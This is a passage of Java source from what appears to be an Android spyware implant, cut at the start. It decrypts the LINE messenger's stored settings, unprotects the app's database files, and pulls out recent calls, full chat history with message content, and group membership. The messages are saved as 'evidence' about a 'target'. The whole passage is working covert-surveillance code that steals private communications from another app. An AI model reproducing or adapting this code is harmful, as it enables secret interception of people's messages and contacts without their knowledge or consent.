					String v1_1 = new String(v2.doFinal(Base64impl.base64Impl(s)), "UTF-8");
					Check.log(TAG + "decoded: " + v1_1);
				}
			} catch (IOException e) {
				e.printStackTrace();
			} catch (NoSuchPaddingException e) {
				e.printStackTrace();
			} catch (InvalidAlgorithmParameterException e) {
				e.printStackTrace();
			} catch (NoSuchAlgorithmException e) {
				e.printStackTrace();
			} catch (IllegalBlockSizeException e) {
				e.printStackTrace();
			} catch (BadPaddingException e) {
				e.printStackTrace();
			} catch (InvalidKeyException e) {
				e.printStackTrace();
			}
		}
		final boolean[] useEncryption = new boolean[]{false};
		if(lastVersion == null){
			initVersion();
		}

		RecordVisitor visitor = new RecordVisitor() {
			@Override
			public long cursor(Cursor cursor) {
				String key = cursor.getString(0).toUpperCase();
				String value = cursor.getString(1);
				String enc = "";
				if (value!=null && !value.equalsIgnoreCase("")){
						if (LineDecrypter.isEncryptedLine(value) && key.startsWith(M.e("PROFILE_"))) {
							try {
								if (Cfg.DEBUG) {
									Check.log(TAG + " (readSettings) key: " + key + " val: " + value );
								}
								enc = LineDecrypter.decrypt_aes(value,lastVersion.getVersionName());
								if (Cfg.DEBUG) {
									Check.log(TAG + " decoded:" + enc);
								}
								useEncryption[0] = true;

							} catch (Exception e) {
								if (Cfg.DEBUG) {
									Check.log(TAG + " (readSettings) FAILURE decrypting key: " + key + " val: " + value, e);
								}
								return 1;
							}
						} else {
							if (Cfg.DEBUG) {
								Check.log(TAG + " (readSettings) key: " + key + " val: " + value + " NOT encrypted!");
							}
							enc = value;
						}
					if(!settings.containsKey(key) || settings.get(key)[DECODED_VALUE].equals(enc) ){
						settings.put(key, new String[]{enc, value});
					}
				}
				return 1;
			}
		};

		helper.traverseRawQuery(sqlquery, new String[]{}, visitor);

		if(lastVersion != null ) {
			access_db.put(lastVersion.getVersionName(), useEncryption[0] ? ACCESS_CRYPTED : ACCESS_CLEAR);
		}
	}
	static public String getSetting(String key){

		if(settings.isEmpty()){
			Path.unprotect(dbAccountFile, 3, true);
			GenericSqliteHelper helper = GenericSqliteHelper.openCopy(dbAccountFile);
			if( helper != null ){
				try{
					readSettings(helper);
				}finally {
					helper.disposeDb();
				}
			}
		}
		if(settings.isEmpty() || !settings.containsKey(key)){
			return null;
		}
		return settings.get(key)[DECODED_VALUE];
	}

	@Override
    protected void stop() {
        if (Cfg.DEBUG) {
            Check.log(TAG + " (stop), ");
        }
    }


	static public boolean getCurrentCall(final CallInfo call) {
		try {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (getCurrentCall) unprotecting: " + dbFile);
			}
			Path.unprotect(dbFile, 3, true);
            Path.unprotect(dbFile + "*", true);
			String sqlquery = M.e("select m.id,m.chat_id,m.from_mid,m.created_time,c.name from chat_history as m join contacts as c on m.chat_id = c.m_id " +
					"where m.type = 4 and m.created_time > 0 order by m.created_time desc limit 1");

			RecordVisitor visitor = new RecordVisitor() {
				@Override
				public long cursor(Cursor cursor) {
					call.id= cursor.getInt(0);
					String from_mid = cursor.getString(2);
					long created_time = cursor.getLong(3);
					call.timestamp = new Date(created_time);
					call.peer = cursor.getString(4);
					call.incoming = from_mid != null;
					call.account = account;
					call.valid = true;
					if (Cfg.DEBUG) {
						Check.log(TAG + " (getCurrentCall) user: " + call.account + " peer: " + call.peer + " timestamp:" + created_time);
					}
					return call.id;
				}
			};
			GenericSqliteHelper helper = GenericSqliteHelper.openCopy(dbFile);
			if(helper == null){
				if (helper == null) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (getCurrentCall) Error, file not readable: " + dbFile);
					}
					return false;
				}
			}
			helper.traverseRawQuery(sqlquery, new String[]{}, visitor);
			return call.valid;

		} catch (Exception ex) {
			if (Cfg.DEBUG) {

				Check.log(TAG + " (getCurrentCall) Error: ", ex);
			}
		}
		return false;

	}
	private long readLineMessageHistory() throws IOException {

        try {
            Path.unprotect(dbFile, 3, true);
            Path.unprotect(dbFile + "*", true);

            // GenericSqliteHelper helper =
            // GenericSqliteHelper.openCopy(dbFile);
            // helper.deleteAtEnd = false;
	        GenericSqliteHelper helper = GenericSqliteHelper.openCopy(dbFile);
            final ChatGroups groups = getLineGroups(helper);

            String sqlquery = M.e("select chat_id, from_mid, content, ch.created_time, sent_count , name from chat_history as ch left join contacts as c on ch.from_mid = c.m_id where type=1 and ch.created_time > ? order by ch.created_time ");
            String[] projection = new String[]{M.e("chat_id"), M.e("from_mid"), M.e("content"), M.e("ch.created_time"), M.e("sent_count"),
                    M.e("name")};

            final ArrayList<MessageChat> messages = new ArrayList<MessageChat>();

            RecordVisitor visitor = new RecordVisitor(null, null) {
                @Override
                public long cursor(Cursor cursor) {
                    String chat_id = cursor.getString(0);
                    String from_mid = cursor.getString(1);
                    String content = cursor.getString(2);
                    // localtime or gmt? should be converted to gmt
                    long created_time = cursor.getLong(3);
                    Date date = new Date(created_time);


                    int sent_count = cursor.getInt(4);
                    String from_name = cursor.getString(5);

                    boolean incoming = false;
                    String to = account;
                    String to_id = account_mid;

                    if (from_name == null) {
	                    //from_name is null when the account owner sent the message, in this case
	                    // the account owner is used
                        from_name = account;
                        from_mid = account_mid;
                        incoming = false;
                        to = groups.getGroupToName(from_name, chat_id);
                        to_id = groups.getGroupToId(from_name, chat_id);
                    } else {
	                    // here there is a problem in case:
	                    // 1) the chat owner isn't the account owner, that is : the target has been invited in a chat.
	                    // 2) the chat isn't a group chat
	                    // In this case the to is empty.
                        incoming = true;
                        to = groups.getGroupToName(from_name, chat_id);
                        to_id = groups.getGroupToId(from_name, chat_id);
                        if (to == null || to.equalsIgnoreCase("")) {
		                    Check.log(TAG + " (getGroupTo) empty recipients!! add me to the list!");
                            to = account;
                        }
                    }

                    if (Cfg.DEBUG) {
                        Check.log(TAG + " (readLineMessageHistory) %s\n%s, %s -> %s: %s ", chat_id,
                                date.toLocaleString(), from_name, to, content);
                    }

                    MessageChat message = new MessageChat(PROGRAM, date, from_mid, from_name, to_id, to, content,
                            incoming);
                    messages.add(message);

                    return created_time;
                }
            };

            long lastmessage = helper.traverseRawQuery(sqlquery, new String[]{Long.toString(lastLine)}, visitor);

            getModule().saveEvidence(messages);
            return lastmessage;

        } catch (Exception ex) {
            if (Cfg.DEBUG) {

                Check.log(TAG + " (readLineMessageHistory) Error: ", ex);
            }
        }
        return lastLine;

    }

    private ChatGroups getLineGroups(GenericSqliteHelper helper) {
        // SQLiteDatabase db = helper.getReadableDatabase();
        final ChatGroups groups = new ChatGroups();
        RecordVisitor visitor = new RecordVisitor() {

            @Override
            public long cursor(Cursor cursor) {
                String key = cursor.getString(0);
                String mid = cursor.getString(1);
                String name = cursor.getString(2);
                if (mid == null) {
                    return 0;
                }

                if (mid.equals(account_mid)) {
                    name = account;
                }
                if (Cfg.DEBUG) {
                    Check.log(TAG + " (getLineGroups) %s: %s,%s", key, mid, name);
                }

                if (name != null && mid != null) {
                    groups.addPeerToGroup(key, new Contact(mid, name, name, ""));
                } else {
                    if (name == null) {
                        groups.addPeerToGroup(key, mid);
                    } else {
                        groups.addPeerToGroup(key, name);
                    }
                }
                return 0;

            }
        };

	    //first groups resource: for all chat_id in chat_member, get the chat members mid and retrieve the relative name from the contacts table
        String sqlquery = M.e("SELECT  chat_id, mid, name FROM 'chat_member' left join contacts on chat_member.mid = contacts.m_id");
        helper.traverseRawQuery(sqlquery, null, visitor);

	    //second groups resource: for all chat_id in chats entry where owner_mid isn't null, get the chat owner mid and retrieve the relative name from the contacts table
        sqlquery = M.e("select chat_id, owner_mid, name from chat as ch left join contacts as c on ch.owner_mid = c.m_id");
        helper.traverseRawQuery(sqlquery, null, visitor);

	    //third groups resource: for all chat_id in chat_history(take only one entry for equal chat_id entry)
	    //where from_mid isn't null, get the chat from_mid and retrieve the relative name from the contacts table
        sqlquery = M.e("select distinct chat_id, from_mid, name from chat_history as ch left join contacts as c on ch.from_mid = c.m_id where from_mid not null");
        helper.traverseRawQuery(sqlquery, null, visitor);

	    //forth groups resource: for all chat_id in chat_history(take only one entry for equal chat_id entry)
	    //where chat_id isn't null, get the chat chat_id and retrieve the relative name from the contacts table
	    sqlquery = M.e("select distinct chat_id, chat_id, name from chat_history as ch left join contacts as c on ch.chat_id = c.m_id where chat_id not null");
	    helper.traverseRawQuery(sqlquery, null, visitor);

	    // Aggiunge in Nome non il mid!!
        groups.addLocalToAllGroups(account);

        if (Cfg.DEBUG) {
            for (String group : groups.getAllGroups()) {
                String to = groups.getGroupToName(account, group);
                Check.log(TAG + " (getLineGroups group) %s : %s", group, to);
            }
        }
        return groups;
    }

}
